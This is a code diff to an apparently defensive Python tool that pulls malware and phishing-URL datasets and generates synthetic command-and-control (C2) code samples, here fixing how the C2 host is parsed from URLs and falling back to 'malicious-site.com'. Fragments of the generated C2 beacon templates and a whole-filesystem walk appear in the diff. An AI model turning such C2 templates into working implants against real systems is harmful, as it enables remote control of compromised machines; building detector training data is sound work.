@@ -171,14 +171,20 @@ for root, dirs, files in os.walk("/"):
         datasets_to_try = self.datasets_config.get("classification_datasets", [
             "deepcode-ai/Malware-Prediction",
             "PurCL/malware-top-100-labels",
-            "RanggaAS/malware_detection",
+            # "RanggaAS/malware_detection",  # Removed as it appears empty
             "pacificsun/microsoft_malware",
         ])
 
         for dataset_name in datasets_to_try:
             try:
                 logger.info(f"Trying dataset: {dataset_name}")
-                dataset = load_dataset(dataset_name, split=split, streaming=True, token=self.token)
+                
+                # Handle datasets that only have 'test' split
+                use_split = split
+                if dataset_name == "deepcode-ai/Malware-Prediction" and split == "train":
+                    use_split = "test"
+                    
+                dataset = load_dataset(dataset_name, split=use_split, streaming=True, token=self.token)
 
                 samples = []
                 for i, item in enumerate(dataset):
@@ -240,7 +246,7 @@ for root, dirs, files in os.walk("/"):
 
         datasets_to_try = self.datasets_config.get("url_datasets", [
             "joshtobin/malicious_urls",
-            "JorgeGMM/malicious_urls",
+            # "JorgeGMM/malicious_urls", # Removed due to metadata issues
             "stanpony/phishing_urls",
             "pirocheto/phishing-url",
             "semihGuner2002/PhishingURLsDataset",
@@ -315,6 +321,15 @@ for root, dirs, files in os.walk("/"):
         Returns:
             Python code demonstrating C2 pattern
         """
+        # Prepare host for socket template
+        try:
+            if "://" in url:
+                c2_host = url.split('://')[1].split('/')[0]
+            else:
+                c2_host = url.split('/')[0]
+        except:
+            c2_host = "malicious-site.com"
+
         templates = [
             # Template 1: Basic requests
             f'''import requests
@@ -385,7 +400,7 @@ if command:
 import json
 import os
 
-C2_HOST = "{url.split('://')[1].split('/')[0]}"
+C2_HOST = "{c2_host}"
 C2_PORT = 443
 
 def establish_connection():
